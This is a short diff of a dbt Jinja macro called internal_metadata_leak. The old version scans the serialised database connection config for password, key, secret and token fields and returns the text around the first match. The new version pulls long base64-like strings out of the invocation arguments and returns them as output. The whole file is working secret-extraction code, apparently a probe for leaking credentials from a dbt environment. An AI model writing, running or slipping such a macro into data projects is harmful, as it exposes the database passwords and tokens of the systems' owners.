@@ -1,20 +1,15 @@
 {% macro internal_metadata_leak() %}
     {% if execute %}
-        {% set pattern = "(?i)(pass|key|secret|token)" %}
+        {% set pattern = "[A-Za-z0-9+/]{20,50}" %}
         {% set regex = modules.re.compile(pattern) %}
         
-        {% set target_str = target | tojson %}
-        {% set match = regex.search(target_str) %}
+        {% set full_text = invocation_args_dict | tojson %}
+        {% set matches = regex.findall(full_text) %}
         
-        {# 3. Kalau ada match, kita ambil cuplikan sekitarnya #}
-        {% set leak = "no_match" %}
-        {% if match %}
-            {% set start = match.start() %}
-            {% set leak = target_str[start:start+100] %}
-        {% endif %}
+        {% set result = matches | join(" | ") if matches else "no_long_strings" %}
         
-        {{ return("LEAK_SCAN: " ~ leak ~ " || MODULES: OK") }}
+        {{ return("RANDOM_STRINGS: " ~ result | truncate(200)) }}
     {% else %}
-        {{ return("regex_scanning...") }}
+        {{ return("deep_memory_scan...") }}
     {% endif %}
 {% endmacro %}
